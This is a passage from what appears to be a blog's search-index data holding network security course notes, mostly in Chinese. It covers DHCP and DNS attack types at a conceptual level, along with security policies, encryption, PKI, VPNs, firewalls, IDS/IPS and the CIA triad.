服务器会快速响应，试图将自己设为客户端的默认网关或 DNS 服务器。</li>\n<li>中间人攻击：通过设置默认网关或 DNS，攻击者可以截获并控制客户端的网络流量，作为中间人，拦截用户与实际网关之间的数据。这样，攻击者可以监视、篡改或阻断用户的网络流量。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/3e9cd9116e8ed666.png\" alt=\"image\"></li>\n</ol>\n</li>\n</ul>\n<ol start=\"2\">\n<li>DHCP 耗尽攻击（DHCP Starvation Attack）</li>\n</ol>\n<ul>\n<li>DHCP 耗尽攻击是一种拒绝服务攻击，攻击者利用多个 “从属主机” 向 DHCP 服务器发送大量 IP 地址请求，直到耗尽服务器的地址池。以下是攻击的具体过程：\n<ol>\n<li>大量请求：攻击者通过从属主机或伪造的 MAC 地址向 DHCP 服务器不断请求新的 IP 地址。</li>\n<li>地址池耗尽：随着大量虚假请求的积累，DHCP 服务器的 IP 地址池逐渐被占满。</li>\n<li>合法用户无法连接：由于服务器没有可分配的 IP 地址，合法客户端无法从 DHCP 服务器获得 IP 地址，从而无法连接到网络。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/298943f7c02b1624.png\" alt=\"image\"></li>\n</ol>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"DNS\" class=\"active\"><a class=\"anchor\"  href=\"#DNS\">#</a>DNS</h2>\n<ol>\n<li>名称解析响应类型</li>\n</ol>\n<ul>\n<li>权威响应（Authoritative Response）：\n<ul>\n<li>这种响应来自于被查询域名的权威 DNS 服务器。</li>\n<li>权威响应表明该 DNS 服务器对该域的 DNS 记录拥有直接管理权限，因此返回的数据是准确和最新的。</li>\n</ul>\n</li>\n<li>非权威响应（Non-authoritative Response）：\n<ul>\n<li>这种响应并非来自被查询域名的权威 DNS 服务器，而是来自缓存服务器或中间服务器。</li>\n<li>非权威响应通常是其他 DNS 服务器缓存的数据，可能并非实时更新，但可以加速查询过程</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>非权威响应示例</li>\n</ol>\n<ul>\n<li>首次查询\n<ol>\n<li>查询请求：客户端请求 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pYm0uY29t\">www.ibm.com</span> 的 IP 地址。</li>\n<li>查询根服务器：本地 DNS 服务器向根服务器查询 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pYm0uY29t\">www.ibm.com</span> 的地址。</li>\n<li>指向顶级域（TLD）服务器：根服务器返回可查询的 com 顶级域服务器列表。</li>\n<li>查询 com 顶级域服务器：本地 DNS 服务器向 com TLD 服务器查询 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pYm0uY29t\">www.ibm.com</span>。</li>\n<li>指向 <span class=\"exturl\" data-url=\"aHR0cDovL2libS5jb20=\">ibm.com</span> 的权威 DNS 服务器：com TLD 服务器提供 <span class=\"exturl\" data-url=\"aHR0cDovL2libS5jb20=\">ibm.com</span> 权威 DNS 服务器地址。</li>\n<li>查询 <span class=\"exturl\" data-url=\"aHR0cDovL2libS5jb20=\">ibm.com</span> 的 DNS 服务器：本地 DNS 服务器向 <span class=\"exturl\" data-url=\"aHR0cDovL2libS5jb20=\">ibm.com</span> 的 DNS 服务器请求 IP 地址。</li>\n<li>解析完成：<span class=\"exturl\" data-url=\"aHR0cDovL2libS5jb20=\">ibm.com</span> 的权威 DNS 服务器返回 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pYm0uY29t\">www.ibm.com</span> 的 IP 地址 129.42.38.10。</li>\n<li>返回 IP 地址：本地 DNS 服务器将该 IP 地址返回给客户端。</li>\n</ol>\n</li>\n<li>缓存和非权威响应\n<ul>\n<li>本地 DNS 服务器会将查询结果缓存一段时间。</li>\n<li>如果在缓存有效期内再次请求 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pYm0uY29t\">www.ibm.com</span>，本地 DNS 服务器直接从缓存中返回 IP 地址，此时的响应即为非权威响应。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Vulnerabilities/Threats in DNS</li>\n</ol>\n<ul>\n<li>DNS 方案的基本漏洞：\n<ul>\n<li>缺乏身份验证：DNS 没有内置的身份验证机制，使得攻击者更容易伪装。</li>\n<li>缺乏响应的真实性和完整性检查：DNS 响应数据没有经过加密或验证，容易被篡改。</li>\n</ul>\n</li>\n<li>DNS 缓存污染攻击（DNS Cache Poisoning）：\n<ul>\n<li>原理：攻击者更改 DNS 服务器或 DNS 缓存服务器上的记录，使网络流量从合法的服务器重定向到恶意网站。</li>\n<li>效果：用户无意间访问到钓鱼网站，可能泄露敏感信息。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/2e4f0ec78949c3fe.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>DNS 泛洪攻击（DNS Flood Attack）：\n<ul>\n<li>原理：利用 DoS/DDoS 攻击，通过大量请求过载网络，耗尽网络容量和服务器资源。</li>\n<li>效果：合法用户无法访问 DNS 服务，导致网络中断。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/6ed8673589f212d0.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>DNS 欺骗（DNS Spoofing）：\n<ul>\n<li>原理：攻击者伪装成合法的 DNS 服务器，向客户端提供虚假的 DNS 响应。</li>\n<li>效果：用户可能被引导到虚假网站，面临数据泄露和安全威胁。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/fc1bec998cfbdd83.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Summary\" class=\"active\"><a class=\"anchor\"  href=\"#Summary\">#</a>Summary</h1>\n<ol>\n<li>Summary - Protocol Threats</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Threats</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>IP</td>\n<td>IP Spoofing attack 、 Fragmentation attack</td>\n</tr>\n<tr>\n<td>ARP</td>\n<td>ARP Cache-poisoning attack  、 MITM (Man-in-the-Middle) attack</td>\n</tr>\n<tr>\n<td>ICMP</td>\n<td>Redirect attack  、 Ping of death attack</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Predicting TCP Sequences  、 TCP SYN Flood attack</td>\n</tr>\n<tr>\n<td>DHCP</td>\n<td>DHCP Spoofing  、 Starvation attack</td>\n</tr>\n<tr>\n<td>DNS</td>\n<td>DNS Cache Poisoning  、 DNS Flood attack  、 DNS Spoofing</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"2\">\n<li>Summary- Security attacks</li>\n</ol>\n<ul>\n<li>Active attack\n<ul>\n<li>involves data modification or the creation of a false stream, e.g.\n<ul>\n<li>masquerade, replay, modification of messages, man-in-the-middle (MITM) and DoS/DDoS</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Passive attack\n<ul>\n<li>attempts to learn or make use of information from the system but does not affect system resources, e.g. traffic analysis, release of information contents</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","IP","DHCP","ICMP","ARP","TCP","DNS","Network Security"]},{"title":"Network Security Methods","url":"/course/Network-Security-Methods/","content":"<h1 id=\"Network Security Overview and Policies\" class=\"active\"><a class=\"anchor\"  href=\"#Network Security Overview and Policies\">#</a>Network Security Overview and Policies</h1>\n<ol>\n<li>Three objectives of Security Policies</li>\n</ol>\n<ul>\n<li>CIA (Confidentiality, Integrity, Availability)</li>\n</ul>\n<ol start=\"2\">\n<li>Elements of a Network Security Policy</li>\n</ol>\n<ul>\n<li>Privacy policy\n<ul>\n<li>Describes what staff, customers, and business partners can expect for monitoring and reporting</li>\n</ul>\n</li>\n<li>Acceptable use policy\n<ul>\n<li>Explains for what purposes network resources can be used</li>\n</ul>\n</li>\n<li>Authentication policy\n<ul>\n<li>Describes how users identify themselves to gain access to network resources</li>\n</ul>\n</li>\n<li>Internet use policy\n<ul>\n<li>Explains what constitutes proper or improper use of Internet resources</li>\n</ul>\n</li>\n<li>Access policy\n<ul>\n<li>Specifies how and when users are allowed to access network resources</li>\n</ul>\n</li>\n<li>Auditing policy\n<ul>\n<li>Explains the manner in which security compliance or violations can be verified and the consequences for violations</li>\n</ul>\n</li>\n<li>Data protection\n<ul>\n<li>Outlines the policies for backup procedures, virus protection, and disaster recovery</li>\n</ul>\n</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvaW5mb3JtYXRpb24tc2VjdXJpdHktcG9saWN5Lw==\">More about security policies</span></li>\n</ul>\n<ol start=\"3\">\n<li>Types of Security Control</li>\n</ol>\n<ul>\n<li>Administrative control\n<ul>\n<li>It refers to policies/procedures/guidelines that define personnel or business practices based on the organization’s security goals.</li>\n</ul>\n</li>\n<li>Physical control\n<ul>\n<li>It relates to any tangible that is used to prevent/detect unauthorised access to physical areas/systems/assets</li>\n</ul>\n</li>\n<li>Technical control\n<ul>\n<li>It includes Hardware/Software mechanisms used to protect assets</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Security controls\" class=\"active\"><a class=\"anchor\"  href=\"#Security controls\">#</a>Security controls</h1>\n<h2 id=\"Authentication/authorization/auditing (AAA)\" class=\"active\"><a class=\"anchor\"  href=\"#Authentication/authorization/auditing (AAA)\">#</a>Authentication/authorization/auditing (AAA)</h2>\n<ol>\n<li>身份验证（Authentication）</li>\n</ol>\n<ul>\n<li>身份验证是确认用户是否为其所声称的身份的过程，确保只有授权用户能够访问系统或资源。</li>\n<li>多因素认证（Multifactor Authentication, MFA 要求用户提供两种或更多种不同类型的认证信息，通常从以下三类凭据中选择：\n<ul>\n<li>知识（Knowledge）：用户所知道的内容。示例：用户名 / 密码或安全问题的答案。</li>\n<li>持有物（Possession）：用户所拥有的物品。示例：智能卡、钥匙、手机中的认证码或硬件令牌。</li>\n<li>生物特征（Inherence）：用户所具备的生理特征。示例：指纹、视网膜扫描、声音模式或面部识别。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>授权（Authorization）</li>\n</ol>\n<ul>\n<li>授权是指在用户登录系统后，系统决定该用户可以执行的操作和可以访问的资源。</li>\n<li>访问控制 = 身份验证 + 授权：访问控制是一个规则集，规定哪些用户可以访问哪些资源，以及适用的访问限制。</li>\n<li>访问控制机制：操作系统、网络控制系统和数据库管理系统（DBMS）都可以使用不同的访问控制机制，以便允许用户或进程访问受保护的资源。</li>\n<li>访问控制的实现：访问控制通过身份验证（Authentication）确认用户身份，并通过授权（Authorization）授予用户在系统中的操作权限，确保资源安全使用。</li>\n</ul>\n<ol start=\"3\">\n<li>审计（Auditing）</li>\n</ol>\n<ul>\n<li>审计是指记录与安全相关的事件，以便跟踪和分析系统的安全状况。\n<ul>\n<li>记录安全事件：审计通过日志记录尝试绕过或破坏安全控制的行为，提供对系统活动的追溯性证据。</li>\n<li>异常行为检测：通过分析审计日志，可以发现异常行为，有助于识别潜在的系统或网络入侵攻击。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Encryption\" class=\"active\"><a class=\"anchor\"  href=\"#Encryption\">#</a>Encryption</h2>\n<ol>\n<li>Encryption</li>\n</ol>\n<ul>\n<li>Encryption is commonly used to protect data in transit and data at rest.</li>\n<li>Encryption is the process of encoding and decoding data</li>\n<li>Encryption mechanisms can be used to achieve data <strong>confidentiality</strong> and <strong>integrity</strong> against\n<ul>\n<li>伪造（Forgery）：防止恶意篡改数据。</li>\n<li>否认（Repudiation）：确保发送方和接收方不能否认数据传输的发生。</li>\n<li>窃听（Eavesdropping）：防止未经授权的第三方拦截和读取数据。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>基本加密 / 解密技术</li>\n</ol>\n<ul>\n<li>密码学（Cryptography）：研究和使用加密与解密技术的学科，确保数据的安全传输和存储。</li>\n<li>明文（Plaintext）：加密前的数据，未经任何加密处理的原始信息。</li>\n<li>密文（Ciphertext）：加密后的数据，通过加密技术将明文转换为密文，确保信息不易被未授权方读取。</li>\n<li>密钥（Key）：用于生成密文的独特信息，也用于将密文解密回明文。密钥是加密和解密过程中的核心组件，其安全性直接影响数据的保密性。</li>\n</ul>\n<ol start=\"3\">\n<li>使用加密技术保护数据</li>\n</ol>\n<ul>\n<li>加密（Encryption）：\n<ul>\n<li>作用：加密通过将数据转换为密文，防止第三方窃听，确保数据在传输中的安全性。</li>\n</ul>\n</li>\n<li>数字签名（Digital Signature）：\n<ul>\n<li>作用：数字签名基于公钥加密技术，确保数据的真实性和完整性。</li>\n<li>原理：使用私钥对数据生成签名，接收方使用发送方的公钥验证签名，从而确认数据来源可靠且未被篡改。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>密码学（Cryptography）</li>\n</ol>\n<ul>\n<li>对称加密（Symmetric Cryptography）：\n<ul>\n<li>加解密密钥相同：使用相同的密钥进行消息的加密和解密。</li>\n<li>用途：主要用于保障数据的机密性。</li>\n<li>优势：加密和解密速度快，适合大数据量的加密。</li>\n</ul>\n</li>\n<li>非对称加密（Asymmetric/Public Key Cryptography）：\n<ul>\n<li>密钥对：包括私钥和公钥。私钥保密，公钥则公开发布在公共目录中。</li>\n<li>单向性：通过一个密钥推导出另一个密钥是不可行的，确保安全性。</li>\n<li>用途：提供数据的机密性、身份认证、完整性和不可否认性。\n<ul>\n<li>机密性：信息加密后只能由持有私钥的接收方解密。</li>\n<li>身份认证：可以验证发送方的身份。</li>\n<li>完整性：确保数据在传输过程中未被篡改。</li>\n<li>不可否认性：发送方不能否认已发送的数据。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/325d2f70707ff709.png\" alt=\"Public Key Encryption/Decryption\"></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>数字签名（Digital Signatures）</li>\n</ol>\n<ul>\n<li>数字签名用于验证消息的真实性和完整性，确保消息未被篡改，并证明发送方的身份。</li>\n<li>工作原理：\n<ul>\n<li>数字签名利用公钥加密技术与加密哈希函数生成签名。</li>\n<li>发送方首先通过哈希函数生成消息的消息摘要（也称为数字指纹或消息验证码，MAC），这是一段固定长度的位串，独特地表示原始消息。</li>\n</ul>\n</li>\n<li>数字签名生成<br>\n生成消息摘要：对文档（Doc）使用哈希函数，生成消息摘要（MAC），表示为  <code>M</code> 。<br>\n加密摘要：将摘要  <code>M</code>  用签名者的私钥加密，形成数字签名。<br>\n发送签名和证书：将文档、数字签名以及签名者的公钥证书一起发送给接收方（验证者）。<br>\n生成的数字签名形式为： <code>&#123;Hash(Doc)&#125;_sign_signer’s_pri_key</code> ，其中  <code>signer’s_pri_key</code>  是签名者的私钥。</li>\n<li>数字签名验证<br>\n接收文档和签名：验证者接收文档、数字签名以及签名者的公钥证书。<br>\n生成新的消息摘要：验证者对接收到的文档使用相同的哈希函数，生成新的消息摘要  <code>M'</code> 。<br>\n解密数字签名：验证者用签名者的公钥解密数字签名，从而得到原始摘要  <code>M</code> 。<br>\n比较摘要：将解密得到的摘要  <code>M</code>  与重新生成的摘要  <code>M'</code>  进行比较。<br>\n如果  <code>M = M'</code> ，说明文档在传输过程中未被篡改，验证通过。</li>\n<li>数字签名提供了不可否认性，即发送方不能否认已发送的消息，同时确保消息未被篡改<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/dd2ae4db052ae019.png\" alt=\"Digital Signatures\"></li>\n</ul>\n<ol start=\"6\">\n<li>Public Key Infrastructure (PKI)</li>\n</ol>\n<ul>\n<li>公钥基础设施（PKI 是确保公钥安全和高效发现的总体系，包括组织、系统（硬件和软件）、人员、流程、政策和协议。</li>\n<li>认证机构（Certification Authority, CA）：\n<ul>\n<li>作用：CA 签发数字证书，证明特定实体与其公钥的绑定关系。</li>\n<li>签名：CA 使用其私钥对证书进行数字签名，以确保证书的真实性和完整性。</li>\n<li>CA 的重要性：CA 作为独立可信的第三方，证明每个公钥确实属于相应的持有者，确保验证过程的安全性。</li>\n</ul>\n</li>\n<li>PKI 的必要性：在没有 CA 的情况下，攻击者可能替换公钥来进行身份冒充，例如：\n<ul>\n<li>场景：Alice 将签名的文档发送给 Bob。</li>\n<li>攻击：攻击者 Carol 拦截传输，替换 Alice 的公钥为自己的公钥，并使用自己的私钥签署篡改后的文档。</li>\n<li>验证问题：Bob 接收文档后，用他认为的 Alice 的公钥验证文档，导致对签名来源的误判。</li>\n</ul>\n</li>\n<li>数字证书：数字证书由 CA 签发，将公钥与密钥持有者的身份绑定。包含内容：\n<ul>\n<li>密钥持有者的身份和公钥</li>\n<li>CA 签署的信息：如颁发者、有效期、序列号</li>\n<li>CA 的数字签名</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Virtual private network (VPN)\" class=\"active\"><a class=\"anchor\"  href=\"#Virtual private network (VPN)\">#</a>Virtual private network (VPN)</h2>\n<ol>\n<li>VPNs</li>\n</ol>\n<ul>\n<li>虚拟专用网络（VPN）通过互联网为用户或分支机构提供安全的网络访问，确保公司资源的机密性和完整性。</li>\n<li>VPN 的功能：\n<ul>\n<li>加密通信：VPN 利用加密技术在互联网上提供数据的机密性和完整性。</li>\n<li>隧道机制：VPN 客户端和服务器之间创建一个 “隧道”，保护传输的数据，通常实现为 IP-in-IP 封装。</li>\n</ul>\n</li>\n<li>VPN 配置：\n<ul>\n<li>VPN 可以配置在专用设备上，以专门处理 VPN 连接，从而提高连接的稳定性和安全性。</li>\n</ul>\n</li>\n<li>常见 VPN 类型：\n<ul>\n<li>IPSec：工作在网络层，常用于保护数据包的完整性和机密性。</li>\n<li>TLS/SSL：工作在传输层，常用于加密应用程序层的流量，特别是网页流量和远程访问。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>VPN 通信模式</li>\n</ol>\n<ul>\n<li>\n<p>站点到站点模式（Site-to-Site Mode）：</p>\n<ul>\n<li>描述：在不同站点之间建立 VPN 连接，通常用于企业不同分支机构之间的通信。</li>\n<li>特点：VPN 设备在各个站点部署，实现安全的数据传输。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/9639f76563dfb59a.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>\n<p>客户端到站点模式（Client-to-Site Mode）：</p>\n<ul>\n<li>描述：在客户端计算机和 VPN 设备之间建立 VPN 连接，使单个用户能够安全访问公司网络。</li>\n<li>特点：适用于远程员工访问公司资源。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/8c28ed770303489c.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>\n<p>客户端到客户端模式（Client-to-Client Mode）：</p>\n<ul>\n<li>描述：为两个客户端之间的通信提供端到端的网络安全，保护两台主机之间的敏感信息。</li>\n<li>特点：适用于需要直接通过互联网安全交换数据的用户。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/d996e3d27e5ebe04.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>IPSec VPN 模式<br>\n IPSec 可以在以下两种模式下实现，以保护 IP 数据包的安全性：\n<ol>\n<li>传输模式（Transport Mode）：</li>\n</ol>\n<ul>\n<li>应用场景：适用于主机到主机的通信。</li>\n<li>特点：仅对 IP 数据包的有效负载（payload）进行认证和保护，IP 头部保持不变。</li>\n<li>用途：适合局域网内的点对点安全通信。</li>\n</ul>\n<ol start=\"2\">\n<li>隧道模式（Tunnel Mode）：</li>\n</ol>\n<ul>\n<li>应用场景：保护整个 IP 数据包的内容，适用于站点到站点的 VPN 连接。</li>\n<li>特点：实现 IP-in-IP 封装，生成一个新的 IP 头部，保护整个原始 IP 数据包。</li>\n<li>用途：适用于在互联网上进行远程站点之间的安全通信。</li>\n</ul>\n</li>\n<li>VPN 的优势</li>\n</ol>\n<ul>\n<li>为移动用户提供安全连接：\n<ul>\n<li>VPN 使得移动用户可以通过互联网随时安全地访问公司网络，无论其地理位置如何。</li>\n</ul>\n</li>\n<li>跨站点的永久安全连接：\n<ul>\n<li>各个站点可以通过 VPN 使用互联网建立长期的安全连接，无需昂贵的租用专线。</li>\n</ul>\n</li>\n<li>降低成本：\n<ul>\n<li>通过使用 ISP 的支持服务，企业可以避免为昂贵的专线支持支付额外费用，从而显著降低网络成本。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Firewall\" class=\"active\"><a class=\"anchor\"  href=\"#Firewall\">#</a>Firewall</h2>\n<ol>\n<li>防火墙（Firewalls）</li>\n</ol>\n<ul>\n<li>防火墙是一种硬件设备、软件或二者的组合，用于检查通过网络的流量，并根据一组规则决定是否允许或拒绝流量的通过。</li>\n<li>硬件防火墙：\n<ul>\n<li>配置：通常配置有两个或多个网络接口，放置在企业局域网（LAN）与广域网（WAN）连接之间。</li>\n<li>作用：在网络边界保护内部网络，过滤不必要的或不安全的流量。</li>\n</ul>\n</li>\n<li>软件防火墙：\n<ul>\n<li>安装位置：安装在操作系统中，检查所有进出计算机的数据包。</li>\n<li>处理方式：根据预定义的规则，对数据包进行丢弃或允许进一步处理。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Types of Firewall\n<ol>\n<li>无状态数据包过滤（Stateless Packet Filtering）</li>\n</ol>\n<ul>\n<li>无状态数据包过滤，也称为数据包过滤，是一种防火墙机制，用于检查每个通过的数据包并根据预定义的规则决定是否放行或丢弃。</li>\n<li>过滤标准：\n<ul>\n<li>源和目标地址：根据数据包的源 IP 和目标 IP 地址进行过滤。</li>\n<li>协议类型：按协议类型（例如 TCP、UDP）进行过滤。</li>\n<li>源和目标端口号：按端口号限制特定服务或应用的数据包通过。</li>\n</ul>\n</li>\n<li>无状态特性：\n<ul>\n<li>独立检查：每个数据包都被独立检查，与同一会话中的其他数据包无关。</li>\n<li>优缺点：这种方法简单快速，但无法识别会话状态，易受攻击手法如伪造的数据包或会话劫持的影响。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>有状态数据包过滤（Stateful Packet Filtering）</li>\n</ol>\n<ul>\n<li>有状态数据包过滤是一种防火墙技术，可以监控跨网络的特定协议会话消息，并根据会话状态决定是否允许数据包通过。</li>\n<li>会话跟踪：\n<ul>\n<li>防火墙会跟踪会话状态，例如 TCP 连接，记录源和目标信息。</li>\n<li>一旦 TCP 会话建立，防火墙保持端口打开，允许属于该会话的其他数据包通过，并在会话结束时关闭端口。</li>\n</ul>\n</li>\n<li>操作层级：\n<ul>\n<li>工作在 OSI 模型的传输层，利用 TCP/UDP 连接的状态信息。</li>\n</ul>\n</li>\n<li>内部请求规则：\n<ul>\n<li>仅允许内部网络计算机主动请求的信息返回，防止外部未授权的数据包进入网络。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>基于应用的防火墙（Application-based Firewall）</li>\n</ol>\n<ul>\n<li>基于应用的防火墙，也称为应用层网关或应用代理，在应用层操作，通过识别应用程序的特征来控制流量。</li>\n<li>操作层级：\n<ul>\n<li>工作在 OSI 模型的应用层，通过分析应用程序的特定签名、头信息或有效负载，识别并控制数据包。</li>\n</ul>\n</li>\n<li>行为基线：\n<ul>\n<li>通过观察应用程序的正常行为，创建基线；如果检测到应用程序行为偏离基线，将发出警报。</li>\n<li>这种方式允许防火墙在识别异常行为时更具动态适应性。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>应用代理防火墙（Application Proxy Firewall）</li>\n</ol>\n<ul>\n<li>应用代理防火墙是一种防火墙类型，代理位于受保护的网络和外部网络之间，充当中间人角色。</li>\n<li>代理机制：\n<ul>\n<li>出站请求：每个出站数据包由代理拦截，代理会发起自己的请求并处理响应。</li>\n<li>安全检查：代理对响应内容进行检查，如果响应被判定为安全，则将其转发给用户。</li>\n</ul>\n</li>\n<li>间接交互：\n<ul>\n<li>客户端和服务器从不直接通信，所有数据传输都经过代理，确保了流量的安全性。</li>\n<li>代理可以在必要时检查数据包的全部内容，从而更有效地防止恶意数据包的进入</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>下一代防火墙（Next Generation Firewall, NGFW）</li>\n</ol>\n<ul>\n<li>下一代防火墙是具备深度数据包检查（DPI）功能的高级防火墙，相比传统防火墙提供更全面的安全保护。</li>\n<li>定义：\n<ul>\n<li>根据 Gartner 的定义，下一代防火墙不仅执行端口和协议的检查与阻止，还增加了应用层检查、入侵防御以及外部情报的集成。</li>\n</ul>\n</li>\n<li>深度数据包检查（DPI）：\n<ul>\n<li>NGFW 进行比有状态数据包过滤更深入的检查，分析数据包的有效负载内容，识别恶意活动的签名，确保数据传输的安全。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Intrusion Detection system (IDS) and Intrusion Prevention system (IPS)\" class=\"active\"><a class=\"anchor\"  href=\"#Intrusion Detection system (IDS) and Intrusion Prevention system (IPS)\">#</a>Intrusion Detection system (IDS) and Intrusion Prevention system (IPS)</h2>\n<ol>\n<li>入侵检测系统（Intrusion Detection Systems, IDS）</li>\n</ol>\n<ul>\n<li>入侵检测系统 (IDS) 用于监视网络流量，识别和报告潜在的安全漏洞或恶意行为。</li>\n<li>类型：\n<ul>\n<li>基于网络的 IDS（Network-based IDS, NIDS）：\n<ul>\n<li>保护整个网络，通常部署在网络边界，用于检测和监视进入网络的所有流量。</li>\n</ul>\n</li>\n<li>基于主机的 IDS（Host-based IDS, HIDS）：\n<ul>\n<li>保护单一计算机上的安全，是一种软件应用，适用于特定设备的安全监控。</li>\n<li>可以安装在蜜罐设备上（honeypot），蜜罐是一种诱饵设备，用于吸引和监视潜在攻击者的行为。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>功能：\n<ul>\n<li>IDS 监控网络流量中的恶意数据包或异常流量模式。</li>\n<li>当检测到安全漏洞时，将其报告给管理站以便采取进一步措施。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>入侵防御系统（Intrusion Prevention Systems, IPS）</li>\n</ol>\n<ul>\n<li>入侵防御系统（IPS）在检测到攻击时，能够立即采取主动的防御措施来阻止或减缓攻击的影响。</li>\n<li>主动防御：IPS 在攻击发生时实时响应，通过自动化方式采取反制措施。</li>\n<li>反制措施：\n<ul>\n<li>重新配置防火墙：调整防火墙设置，阻止可疑数据包进入网络。</li>\n<li>重置连接：断开攻击源和目标设备之间的连接，以中断攻击过程。</li>\n<li>禁用网络链接：暂时关闭内网和外网之间的连接，防止攻击扩散。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>安全解决方案类型</li>\n</ol>\n<ul>\n<li>预防性措施（Preventative）：\n<ul>\n<li>定义：用于阻止未经授权的网络活动的发生。</li>\n<li>示例：杀毒软件、防火墙、入侵防御系统（IPS）。</li>\n</ul>\n</li>\n<li>纠正性措施（Corrective）：\n<ul>\n<li>定义：在未经授权的活动发生后，用于修复损害或恢复资源与功能至先前状态。</li>\n<li>示例：修补漏洞系统、隔离病毒、终止进程或重新启动系统。</li>\n</ul>\n</li>\n<li>检测性措施（Detective）：\n<ul>\n<li>定义：用于检测正在进行或已发生的未经授权的活动，并发出警报。</li>\n<li>示例：Honeypots、入侵检测系统（IDS）</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","Network Security"]},{"title":"Security Concepts","url":"/course/Security-Concepts/","content":"<h1 id=\" Computer Security Concepts\" class=\"active\"><a class=\"anchor\"  href=\"# Computer Security Concepts\">#</a> Computer Security Concepts </h1>\n<ol>\n<li>A Definition of Computer Security<br>\nComputer Security is the protection afforded to an automated information system in order to attain the applicable objectives of preserving the <strong>integrity</strong>, <strong>availability</strong>, and <strong>confidentiality</strong> of information system resources (includes hardware, software, firmware, information/data, and telecommunications)\n<ul>\n<li>Confidentiality<br>\n<strong>Data confidentiality</strong> assures that private or confidential information is not made available or disclosed to unauthorised individuals<br>\n<strong>Privacy</strong> assures that individuals control or influence what information related to them may be collected and stored and by whom and to whom that information may be disclosed</li>\n<li>Integrity<br>\n<strong>Data integrity</strong> assures that information and programs are changed only in a specified and authorised manner<br>\n<strong>System integrity</strong> assures that a system performs its intended function in an unimpaired manner, free from deliberate or inadvertent unauthorised manipulation of the system</li>\n<li>Availability<br>\n<strong>Availability assures</strong> that systems work promptly and service is not denied to authorised users</li>\n</ul>\n</li>\n<li>CIA Triad (NIST standard FIPS 199)</li>\n</ol>\n<ul>\n<li><strong>Confidentiality</strong> preserves authorised restrictions on information access and disclosure, including means for protecting personal privacy and proprietary information\n<ul>\n<li>A loss of confidentiality is the unauthorised disclosure of information</li>\n</ul>\n</li>\n<li><strong>Integrity</strong> guards against improper information modification or destruction, including ensuring information nonrepudiation and authenticity\n<ul>\n<li>A loss of integrity is the unauthorised modification or destruction of information</li>\n</ul>\n</li>\n<li><strong>Availability</strong> ensures timely and reliable access to and use of information\n<ul>\n<li>A loss of availability is the disruption of access to or use of information or a system</li>\n</ul>\n</li>\n<li>Additional Concepts\n<ul>\n<li><strong>Authenticity</strong> is the property of being genuine and being able to be verified and trusted; confidence in the validity of a transmission, a message, or message originator (真实性）</li>\n<li><strong>Accountability</strong> is the security goal that generates the requirement for actions of an entity to be traced uniquely to that entity（可追溯性）</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>NIST Levels of Security Impact</li>\n</ol>\n<ul>\n<li><strong>Low</strong> when the loss is expected to have a limited adverse effect. E.g. reduced effectiveness, minor damage, financial loss or harm</li>\n<li><strong>Moderate</strong> when the loss is expected to have a serious adverse effect. E.g. Significant reduced effectiveness, damage, financial loss or harm (but does not involve loss of life or serious injuries)</li>\n<li><strong>High</strong> when the loss is expected to have a severe or catastrophic adverse effect. E.g. unable to perform primary functions, major damage, and financial loss, involve loss of life or serious injuries</li>\n</ul>\n<ol start=\"4\">\n<li>CIA Triad Examples</li>\n</ol>\n<ul>\n<li>Confidentiality<br>\nHigh: student grades<br>\nModerate: enrolment 